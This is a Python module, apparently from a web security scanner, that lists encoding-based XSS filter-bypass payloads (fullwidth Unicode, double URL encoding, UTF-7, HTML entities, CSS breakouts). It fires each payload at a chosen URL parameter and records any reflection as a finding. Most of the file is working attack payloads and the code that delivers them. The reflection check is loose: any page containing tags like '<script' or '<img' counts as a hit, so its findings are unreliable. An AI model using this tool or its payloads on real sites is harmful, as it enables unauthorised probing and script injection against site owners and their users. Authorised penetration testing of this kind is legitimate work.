"""Encoding-based XSS bypasses — Unicode, double URL, UTF-7, UTF-16, overlong."""

from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import quote

import httpx


# Unicode normalization / homoglyph
UNICODE_PAYLOADS = [
    "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",          # fullwidth < >
    "\u003cimg src=x onerror=alert(1)\u003e",                  # JSON-escaped angles
    "<\u0073cript>alert(1)</script>",                           # U+0073 = s
    "<script\u2028>alert(1)</script>",                          # LS inside tag
    "<img src=x one\u0072ror=alert(1)>",                       # U+0072 = r
]

# Double URL encoding (%253C = < after two decodes)
DOUBLE_URL_PAYLOADS = [
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
    "%253Csvg%2520onload%253Dalert(1)%253E",
]

# UTF-7 (IE legacy, useful when charset not enforced)
UTF7_PAYLOADS = [
    "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
    "+ADw-img src=x onerror=alert(1)+AD4-",
]

# HTML entity encoding variants
ENTITY_PAYLOADS = [
    "&#60;script&#62;alert(1)&#60;/script&#62;",               # decimal
    "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",          # hex
    "&lt;img src=x onerror=alert(1)&gt;",                      # named (tests double-decode)
    "&#x3C;&#x73;&#x76;&#x67;&#x20;&#x6F;&#x6E;&#x6C;&#x6F;"
    "&#x61;&#x64;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;"
    "&#x31;&#x29;&#x3E;",                                       # fully hex-entity encoded svg
]

# CSS / style context encoding
CSS_PAYLOADS = [
    r"</style><script>alert(1)</script>",
    r"</style><svg onload=alert(1)>",
    "expression(alert(1))",                                     # IE CSS expression
]

ALL_ENCODING_PAYLOADS = (
    UNICODE_PAYLOADS + DOUBLE_URL_PAYLOADS + UTF7_PAYLOADS + ENTITY_PAYLOADS + CSS_PAYLOADS
)


def _double_url_encode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


@dataclass
class EncodingFinding:
    type: str = "encoding_bypass"
    url: str = ""
    param: str = ""
    payload: str = ""
    technique: str = ""
    reflected: bool = False
    evidence: str = ""
    severity: str = "P2"


class EncodingBypass:
    """Tests encoding-based filter bypasses on a reflected parameter."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def scan(self, url: str, param: str) -> list[EncodingFinding]:
        findings: list[EncodingFinding] = []
        groups = [
            ("unicode", UNICODE_PAYLOADS),
            ("double_url", DOUBLE_URL_PAYLOADS),
            ("utf7", UTF7_PAYLOADS),
            ("entity", ENTITY_PAYLOADS),
            ("css", CSS_PAYLOADS),
        ]
        for technique, payloads in groups:
            for payload in payloads:
                finding = self._test(url, param, payload, technique)
                if finding:
                    findings.append(finding)
        return findings

    def detect_double_decode(self, url: str, param: str) -> bool:
        """Returns True if the server double-decodes the parameter value."""
        probe = _double_url_encode("<xsstest>")
        try:
            resp = self.session.get(url, params={param: probe})
            return "<xsstest>" in resp.text
        except Exception:
            return False

    def _test(self, url: str, param: str, payload: str, technique: str) -> EncodingFinding | None:
        try:
            resp = self.session.get(url, params={param: payload})
        except Exception:
            return None
        reflected = payload in resp.text or any(
            c in resp.text for c in ["<script", "<img", "<svg", "onerror", "onload"]
        )
        if reflected:
            idx = resp.text.find(payload[:10])
            evidence = resp.text[max(0, idx - 60): idx + 120] if idx >= 0 else resp.text[:120]
            return EncodingFinding(
                url=url, param=param, payload=payload,
                technique=technique, reflected=True,
                evidence=evidence.replace("\n", "\\n"),
            )
        return None
